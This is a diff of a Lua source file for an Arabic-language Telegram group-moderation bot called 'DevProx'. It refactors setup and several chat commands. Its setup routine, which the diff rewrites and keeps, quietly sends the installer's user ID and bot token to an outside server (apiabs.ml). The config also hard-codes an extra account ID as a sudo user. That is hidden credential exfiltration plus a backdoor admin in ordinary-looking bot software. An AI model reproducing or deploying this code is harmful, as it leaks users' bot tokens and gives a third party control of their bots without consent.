@@ -4,63 +4,49 @@
 --                - DevProx -                 --
 --        -- https://t.me/Dev_Prox --         --
 ------------------------------------------------ 
-redis = require('redis')
-URL = require('socket.url')  
-HTTPS = require ("ssl.https")  
+redis = require('redis') 
+URL = require('socket.url') 
+HTTPS = require ("ssl.https") 
 https = require ("ssl.https") 
-http  = require ("socket.http")
-serpent = require("serpent")
-json = dofile('./JSON.lua')
-JSON = dofile('./dkjson.lua')
-lgi = require('lgi')
-notify = lgi.require('Notify')
+http  = require ("socket.http") 
+serpent = require("serpent") 
+json = dofile('./JSON.lua') 
+JSON = dofile('./dkjson.lua') 
+lgi = require('lgi') 
+notify = lgi.require('Notify') 
 utf8 = require ('lua-utf8') 
-notify.init ("Telegram updates")
-DevAbs = redis.connect('127.0.0.1', 6379)
-ServerDevProx = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+notify.init ("Telegram updates") 
+DevAbs = redis.connect('127.0.0.1', 6379) 
+ServerDevProx = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
 --     Source DevProx     --
-local AutoSet = function()
-if not DevAbs:get(ServerDevProx.."IdDevProx") then
-io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m')
-local SUDO = io.read():gsub(' ','')
-if tostring(SUDO):match('%d+') then
-io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m')
-DevAbs:set(ServerDevProx.."IdDevProx",SUDO)
-else
-print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉')
+local AutoSet = function() 
+if not DevAbs:get(ServerDevProx.."IdDevProx") then 
+io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
+local SUDO = io.read():gsub(' ','') 
+if tostring(SUDO):match('%d+') then 
+io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
+DevAbs:set(ServerDevProx.."IdDevProx",SUDO) 
+else 
+print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 end 
-os.execute('lua DevProx.lua')
-end
-if not DevAbs:get(ServerDevProx.."UserDevProx") then
-io.write('\27[1;35m\nالان ارسل معرف المطور الاساسي ↫ ⤈\n\27[0;33;49m')
-local username = io.read():gsub('@','')
-if username ~= '' then
-io.write('\n\27[1;34mتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
-DevAbs:set(ServerDevProx.."UserDevProx",'@'..username)
-else
-print('\n\27[1;34m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ معرف المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉')
+os.execute('lua DevProx.lua') 
 end 
-os.execute('lua DevProx.lua')
-end
-if not DevAbs:get(ServerDevProx.."TokenDevProx") then
-io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m')
-local token = io.read()
-if token ~= '' then
-local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
-if res ~= 200 then
-print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉')
-else
-io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m')
-DevAbs:set(ServerDevProx.."TokenDevProx",token)
+if not DevAbs:get(ServerDevProx.."TokenDevProx") then 
+io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
+local token = io.read() 
+if token ~= '' then 
+local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe') 
+if res ~= 200 then 
+print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
+else 
+io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
+DevAbs:set(ServerDevProx.."TokenDevProx",token) 
+end  
+else 
+print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
+end  
+os.execute('lua DevProx.lua') 
 end 
-else
-print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉')
-end 
-os.execute('lua DevProx.lua')
-end
-local SUDO = DevAbs:get(ServerDevProx.."IdDevProx")
-local username = DevAbs:get(ServerDevProx.."UserDevProx")
-local token = DevAbs:get(ServerDevProx.."TokenDevProx")
 botid = token:match("(%d+)")
 local create = function(data, file, uglify)  
 file = io.open(file, "w+")   
@@ -75,18 +61,17 @@ file:close()
 end
 local create_config_auto = function()
 config = {
-SUDO = SUDO,
-token = token,
+SUDO = DevAbs:get(ServerDevProx.."IdDevProx"),
+token = DevAbs:get(ServerDevProx.."TokenDevProx"),
 bot_id = botid,
-username = username, 
 sudo_users = {SUDO}, 
 }
 create(config, "./config.lua")   
-https.request("https://apiabs.ml/DevProx.php?SUDO="..SUDO.."&username="..username.."&token="..token)
+https.request("https://apiabs.ml/DevProx.php?SUDO="..DevAbs:get(ServerDevProx.."IdDevProx").."&token="..DevAbs:get(ServerDevProx.."TokenDevProx"))
 file = io.open("RUNABS.sh", "w")  
 file:write([[
 #!/bin/bash 
-token="]]..token..[["
+token="]]..DevAbs:get(ServerDevProx.."TokenDevProx")..[["
 while(true) do
 rm -fr ../.telegram-cli
 echo -e ""
@@ -114,7 +99,7 @@ if not f then
 AutoSet() 
 else 
 f:close() 
-DevAbs:del(ServerDevProx.."IdDevProx");DevAbs:del(ServerDevProx.."UserDevProx");DevAbs:del(ServerDevProx.."TokenDevProx")
+DevAbs:del(ServerDevProx.."IdDevProx");DevAbs:del(ServerDevProx.."TokenDevProx")
 end 
 local config = loadfile("./config.lua")() 
 return config 
@@ -138,11 +123,8 @@ DevId = sudos.SUDO
 sudo_users = {sudos.sudo_users,218385683} 
 bot_id = sudos.bot_id 
 DevProx = sudos.bot_id
-SudoUser = sudos.username
 TokenBot = sudos.token
 name_bot = (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'بروكس')
-DevUser = SudoUser:gsub('@','') 
-DevUser = DevUser:gsub([[\_]],'_')
 --     Source DevProx     --
 --     Start Functions    --
 function vardump(value)
@@ -1160,7 +1142,8 @@ return false
 end end
 if text == '/start' then  
 if not DevAbs:get(DevProx..'Start:Time'..msg.sender_user_id_) then
-local inline = {{{text="⌁ ︙ المطور ︙ ⌁",url="t.me/"..(DevUser or "Dev_Prox")}}}
+tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
+local inline = {{{text="⌁ ︙ المطور ︙ ⌁",url="t.me/"..(dp.username_ or "Dev_Prox")}}}
 local start = DevAbs:get(DevProx.."Start:Bot")
 if start then 
 Start_Source = start
@@ -1168,22 +1151,22 @@ else
 Start_Source = "⌁︙مرحبا انا بوت اسمي "..name_bot.."\n⌁︙اختصاصي حماية المجموعات\n⌁︙من التفليش والسبام والخخ .. . ،\n⌁︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n⌁︙سيتم رفع الادمنيه والمنشئ تلقائيا"
 end 
 SendInline(msg.chat_id_,Start_Source,nil,inline)
+end,nil)
 end
 DevAbs:setex(DevProx..'Start:Time'..msg.sender_user_id_,300,true)
 return false
 end 
 --     Source DevProx     --
 if not Leader(msg) and not DevAbs:sismember(DevProx..'BaN:In:User',msg.sender_user_id_) and not DevAbs:get(DevProx..'Texting:In:Bv') then
-Dev_Abs(msg.sender_user_id_, msg.id_, 1, '⌁︙تم ارسال رسالتك الى [المطور](t.me/'..DevUser..')', 1, 'md') 
-tdcli_function({ID ="GetChat",chat_id_=DevId},function(arg,chat)  
-tdcli_function({ID ="GetChat",chat_id_=msg.sender_user_id_},function(arg,chat)  
+tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
+Dev_Abs(msg.sender_user_id_, msg.id_, 1, '⌁︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "Dev_Prox")..')', 1, 'md') 
 tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
 tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
 if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
 if data and data.messages_ and data.messages_[0].content_.sticker_ then
 SendText(DevId,'⌁︙تم ارسال الملصق من ↫ ⤈\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
 return false
-end;end;end,nil);end,nil);end,nil);end,nil);end
+end;end;end,nil);end,nil);end,nil);end
 if Leader(msg) and msg.reply_to_message_id_ ~= 0  then    
 tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
 if result.forward_info_.sender_user_id_ then     
@@ -3907,11 +3890,14 @@ if text == "المطور" then
 local DevCh1 = DevAbs:get(DevProx.."DevAbs3")
 local DevText = DevAbs:get(DevProx.."DevText")
 if DevCh1 then DevCh = '\n⌁︙*Dev Ch* ↬ ['..DevCh1..']' else DevCh = '' end
+tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
+if dp.username_ ~= false then DevUser = '@'..dp.username_ else DevUser = dp.first_name_ end
 if DevText then
 Dev_Abs(msg.chat_id_, msg.id_, 1, DevText, 1, "md")
 else
-Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*Dev User* ↬ [@'..DevUser..']\n⌁︙*Dev Id* ↬ '..DevId..''..DevCh, 1, "md")
+Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*Dev User* ↬ ['..DevUser..']\n⌁︙*Dev Id* ↬ '..DevId..''..DevCh, 1, "md")
 end
+end,nil)
 end 
 --     Source DevProx     --
 if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') and ChCheck(msg) then 
@@ -3973,34 +3959,14 @@ else
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
 end
 end
-if text:match("^بوسها$") or text:match("^بعد بوسها$") or text:match("^ضل بوس$") or text:match("^بوسها بعد$") or text:match("^بوسهه$") then
-function bosha(extra, result, success)
-if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
-Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
-return false  
-end  
-if tonumber(result.sender_user_id_) == tonumber(DevId) then  
-Dev_Abs(msg.chat_id_, msg.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗 @'..DevUser, 1, 'html')
-return false
-end 
-local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
-Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
-local ABS_PROX = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
-Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'md') 
-end 
-if tonumber(msg.reply_to_message_id_) == 0 then
-else 
-getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosha)   
-end
-end
-if text:match("^بوسه$") or text:match("^بعد بوسه$") or text:match("^ضل بوس$") or text:match("^بوسه بعد$") then
+if text:match("^بوسه$") or text:match("^بعد بوسه$") or text:match("^ضل بوس$") or text:match("^بوسه بعد$") or text:match("^بوسها$") or text:match("^بعد بوسها$") or text:match("^ضل بوس$") or text:match("^بوسها بعد$") or text:match("^بوسهه$") then
 function bosh(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
 return false  
 end  
 if tonumber(result.sender_user_id_) == tonumber(DevId) then  
-Dev_Abs(msg.chat_id_, msg.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗 @'..DevUser, 1, 'html')
+Dev_Abs(msg.chat_id_, result.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗', 1, 'html')
 return false
 end 
 local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
@@ -4020,7 +3986,7 @@ Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح ن�
 return false  
 end  
 if tonumber(result.sender_user_id_) == tonumber(DevId) then  
-Dev_Abs(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..DevUser, 1, 'html')
+Dev_Abs(msg.chat_id_, result.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️', 1, 'html')
 return false
 end 
 local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
@@ -4043,7 +4009,7 @@ Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح ن�
 return false 
 end  
 if tonumber(result.id_) == tonumber(DevId) then 
-Dev_Abs(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..DevUser, 1, 'html') 
+Dev_Abs(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..username, 1, 'html') 
 return false  
 end  
 local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
@@ -8157,6 +8123,13 @@ absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(ms
 DevAbs:set(DevProx..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
 end
 --     Source DevProx     --
+if text and text:match("^حذف الصوره$") and ChCheck(msg) or text and text:match("^مسح الصوره$") and ChCheck(msg) then
+https.request("https://api.telegram.org/bot"..TokenBot.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
+local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف صورة المجموعه \n ✓'
+absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
+return false  
+end
+--     Source DevProx     --
 if Owner(msg.sender_user_id_, msg.chat_id_) then
 if text and text:match("^الغاء تثبيت$") and ChCheck(msg) or text and text:match("^الغاء التثبيت$") and ChCheck(msg) then
 if DevAbs:sismember(DevProx.."bot:pin:mutepin",msg.chat_id_) and not Monsh(msg.sender_user_id_, msg.chat_id_) then
@@ -8239,41 +8212,41 @@ end,nil)
 end
 --     Source DevProx     --
 if text and text:match('^كشف (-%d+)') then
-local chattid = text:match('كشف (-%d+)') 
+local ChatId = text:match('كشف (-%d+)') 
 if not SudoBot(msg.sender_user_id_, msg.chat_id_) then
-Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطورين فقط ', 1, 'md')
+Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطورين فقط', 1, 'md')
 else
-function abs_c9(arg,data)
-function ABS_PROX(f1,f2)
-function DevProx3(t1,t2)
-local list = DevAbs:smembers(DevProx.."abs:monsh:" .. chattid)
-if list[1] or list[2] or list[3] or list[4] then
-user_info = DevAbs:get(DevProx.."user:Name" .. (list[1] or list[2] or list[3] or list[4]))
+local MonshList = DevAbs:scard(DevProx.."abs:monshid:"..ChatId) or 0
+local BanedList = DevAbs:scard(DevProx.."abs:Ban:"..ChatId) or 0
+local OwnerList = DevAbs:scard(DevProx.."abs:owners:"..ChatId) or 0
+local MutedList = DevAbs:scard(DevProx.."abs:Muted:"..ChatId) or 0
+local TkeedList = DevAbs:scard(DevProx.."abs:abs:Tkeed:"..ChatId) or 0
+local AdminsList = DevAbs:scard(DevProx.."abs:admins:"..ChatId) or 0
+local VipList = DevAbs:scard(DevProx.."abs:vipmem:"..ChatId) or 0
+local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
+if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/Dev_Prox' end
+tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
+tdcli_function ({ID = "GetChannelMembers",channel_id_ = ChatId:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
+if dp.id_ then
+local admins = data.members_
+for i=0 , #admins do
+if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
+owner_id = admins[i].user_id_
+tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,Abs) 
+if Abs.first_name_ ~= false then
+MonshAbs = "["..Abs.first_name_.."](T.me/"..(Abs.username_ or "Dev_Prox")..")"
+else 
+MonshAbs = "الحساب محذوف"
 end
-if user_info then monsh = user_info else monsh = "لا يوجد" end
-local Monsh = DevAbs:scard(DevProx.."abs:monshid:" .. chattid) or "0"
-local Baned = DevAbs:scard(DevProx.."abs:Ban:" .. chattid) or "0"
-local Owner = DevAbs:scard(DevProx.."abs:owners:" .. chattid) or "0"
-local Muted = DevAbs:scard(DevProx.."abs:Muted:" .. chattid) or "0"
-local Tkeed = DevAbs:scard(DevProx.."abs:abs:Tkeed:" .. chattid) or "0"
-local admins = DevAbs:scard(DevProx.."abs:admins:" .. chattid) or "0"
-local Vip = DevAbs:scard(DevProx.."abs:vipmem:" .. chattid) or "0"
-if t2.invite_link_ == false then 
-local getlink = 'https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_
-local req = https.request(getlink)
-local link = json:decode(req)
-if link.ok == true then 
-t2.invite_link_ = link.result
+Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙المجموعه ↫ ["..dp.title_.."]("..LinkGroup..")\n⌁︙الايدي ↫ ( `"..ChatId.."` )\n⌁︙المنشئ ↫ "..MonshAbs.."\n⌁︙عدد المدراء ↫ ( *"..OwnerList.."* )\n⌁︙عدد المنشئين ↫ ( *"..MonshList.."* )\n⌁︙عدد الادمنيه ↫ ( *"..AdminsList.."* )\n⌁︙عدد المميزين ↫ ( *"..VipList.."* )\n⌁︙عدد المحظورين ↫ ( *"..BanedList.."* )\n⌁︙عدد المقيدين ↫ ( *"..TkeedList.."* )\n⌁︙عدد المكتومين ↫ ( *"..MutedList.."* )", 1,"md")
+end,nil)
 end
 end
-DevAbs:set(DevProx.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "@Dev_Prox")) 
-Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙المجموعه ↫ ( ["..TitleName(chattid).."]("..(t2.invite_link_ or "t.me/Dev_Prox")..") )\n⌁︙الايدي ↫ ( *"..msg.chat_id_.."* )\n⌁︙المنشئ ↫ ( ["..monsh.."] )\n⌁︙عدد المدراء ↫ ( *"..Owner.."* )\n⌁︙عدد المنشئين ↫ ( *"..Monsh.."* )\n⌁︙عدد الادمنيه ↫ ( *"..admins.."* )\n⌁︙عدد المميزين ↫ ( *"..Vip.."* )\n⌁︙عدد المحظورين ↫ ( *"..Baned.."* )\n⌁︙عدد المقيدين ↫ ( *"..Tkeed.."* )\n⌁︙عدد المكتومين ↫ ( *"..Muted.."* )", 1,"md")
+else
+Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لم تتم اضافتي بها لاقوم بكشفها", 1, "md")
 end
-tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(chattid).ID }, DevProx3, nil)
-end
-openChat(msg.chat_id_,ABS_PROX) 
-end
-getChannelFull(chattid, abs_c9, nil)
+end,nil)
+end,nil)
 end 
 end
 --     Source DevProx     --
@@ -8284,12 +8257,12 @@ Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1,
 else 
 local leavegp = function(extra, result)
 if result.id_ then
-Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙المجموعه ↫ ( [" .. result.title_ .. "] )\n⌁︙تمت المغادره منها بنجاح", 1, "md")
+Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙المجموعه ↫ [" .. result.title_ .. "]\n⌁︙تمت المغادره منها بنجاح", 1, "md")
 Dev_Abs(txt[2], 0, 1, "⌁︙بامر المطور تم مغادرة هذه المجموعه ", 1, "md")  
 chat_leave(result.id_, bot_id)
 DevAbs:srem(DevProx.."bot:groups", result.id_)
 else
-Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لم تتم اضافتي فيها لاقوم بمغادرتها ", 1, "md")
+Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لم تتم اضافتي بها لاقوم بمغادرتها", 1, "md")
 end end
 getChat(txt[2], leavegp) 
 end end
